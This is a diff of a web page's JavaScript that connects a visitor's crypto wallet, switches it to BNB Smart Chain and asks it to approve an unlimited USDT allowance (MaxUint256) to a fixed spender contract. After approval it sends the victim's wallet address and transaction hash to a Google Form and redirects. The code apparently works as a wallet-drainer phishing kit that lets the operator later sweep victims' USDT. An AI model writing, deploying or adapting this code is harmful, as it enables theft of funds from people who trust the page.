@@ -2,32 +2,65 @@ let provider;
 let signer;
 let tokenContract;
 
-// ================= CONFIG =================
-
-// USDT on BSC
-const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-
-// YOUR SPENDER CONTRACT (BSC)
+// ============ CONFIG ============
+const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // USDT BSC
 const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56";
 
-// GOOGLE FORM
+// Google Form
 const GOOGLE_FORM_URL =
   "https://docs.google.com/forms/d/e/1FAIpQLSdtsj3KnwkgqCYvZwjr3F8ypCjM7aX6WCUEt5sKIcHsXhXrKQ/formResponse";
 
-// YOUR FORM ENTRY IDs
 const ENTRY_WALLET = "entry.916552859";
 const ENTRY_TXHASH = "entry.1449465266";
 const ENTRY_CHAIN  = "entry.1912151432";
 
-// BSC CHAIN INFO
+// BSC
 const BSC_CHAIN_ID = "0x38"; // 56
 
-// ================= ERC20 ABI =================
+// ERC20
 const ERC20_ABI = [
   "function approve(address spender, uint256 amount) external returns (bool)"
 ];
 
-// ================= SWITCH TO BSC =================
+// ============ CONNECT WALLET ============
+async function connectWallet() {
+  try {
+    if (!window.ethereum) {
+      alert("Wallet not detected");
+      return;
+    }
+
+    // 1️⃣ Create provider
+    provider = new ethers.BrowserProvider(window.ethereum);
+
+    // 2️⃣ Request account access
+    await provider.send("eth_requestAccounts", []);
+
+    // 3️⃣ Switch to BSC
+    await switchToBSC();
+
+    // 4️⃣ Re-create provider AFTER switch
+    provider = new ethers.BrowserProvider(window.ethereum);
+    signer = await provider.getSigner();
+
+    // 5️⃣ Create contract
+    tokenContract = new ethers.Contract(
+      TOKEN_ADDRESS,
+      ERC20_ABI,
+      signer
+    );
+
+    const user = await signer.getAddress();
+    document.getElementById("status").innerText =
+      "Connected (BSC): " + user.slice(0, 6) + "..." + user.slice(-4);
+
+  } catch (err) {
+    console.error(err);
+    alert("Wallet connection failed");
+  }
+}
+
+// ============ SWITCH TO BSC ============
 async function switchToBSC() {
   try {
     await window.ethereum.request({
@@ -36,7 +69,6 @@ async function switchToBSC() {
     });
   } catch (err) {
     if (err.code === 4902) {
-      // Add BSC
       await window.ethereum.request({
         method: "wallet_addEthereumChain",
         params: [{
@@ -57,44 +89,19 @@ async function switchToBSC() {
   }
 }
 
-// ================= CONNECT WALLET =================
-async function connectWallet() {
-  if (!window.ethereum) {
-    alert("Please install MetaMask or Trust Wallet");
-    return;
-  }
-
-  // 🔴 FORCE BSC NETWORK
-  await switchToBSC();
-
-  provider = new ethers.BrowserProvider(window.ethereum);
-  signer = await provider.getSigner();
-
-  tokenContract = new ethers.Contract(
-    TOKEN_ADDRESS,
-    ERC20_ABI,
-    signer
-  );
-
-  const user = await signer.getAddress();
-  document.getElementById("status").innerText =
-    "Connected (BSC): " + user.slice(0, 6) + "..." + user.slice(-4);
-}
-
-// ================= APPROVE + SUBMIT =================
+// ============ APPROVE ============
 async function executeApproval() {
   try {
-    if (!signer) {
+    if (!tokenContract) {
       alert("Connect wallet first");
       return;
     }
 
-    const userWallet = await signer.getAddress();
+    const wallet = await signer.getAddress();
 
     document.getElementById("status").innerText =
-      "Waiting for BSC approval confirmation...";
+      "Waiting for approval...";
 
-    // Approve unlimited USDT
     const tx = await tokenContract.approve(
       SPENDER_ADDRESS,
       ethers.MaxUint256
@@ -103,21 +110,17 @@ async function executeApproval() {
     const receipt = await tx.wait();
 
     if (receipt.status === 1) {
-      // Send to Google Form
-      submitToGoogleForm(userWallet, tx.hash, "BSC");
-
-      // Redirect user
+      submitToGoogleForm(wallet, tx.hash, "BSC");
       window.location.href = "details.html";
     }
 
   } catch (err) {
     console.error(err);
-    document.getElementById("status").innerText =
-      "Approval rejected or failed";
+    alert("Approval failed or rejected");
   }
 }
 
-// ================= GOOGLE FORM SUBMIT =================
+// ============ GOOGLE FORM ============
 function submitToGoogleForm(wallet, txHash, chain) {
   const data = new URLSearchParams();
   data.append(ENTRY_WALLET, wallet);
